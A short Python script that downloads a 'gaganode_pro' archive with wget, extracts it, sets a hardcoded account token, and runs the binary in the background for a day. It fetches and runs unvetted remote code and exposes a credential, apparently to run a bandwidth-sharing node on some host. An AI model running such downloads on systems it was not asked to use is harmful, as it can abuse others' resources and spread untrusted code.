import sys
import os

os.system("wget https://assets.coreservice.io/public/package/66/gaganode_pro/0.0.300/gaganode_pro-0_0_300.tar.gz")
os.system("tar xf gaganode_pro-0_0_300.tar.gz")
os.system("./gaganode-linux-amd64/gaganode config set --token=qwvmrtoforlbkyho11e497c8f05285f7")
os.system("nohup ./gaganode-linux-amd64/gaganode 2>&1 &")
os.system("sleep 1440m")
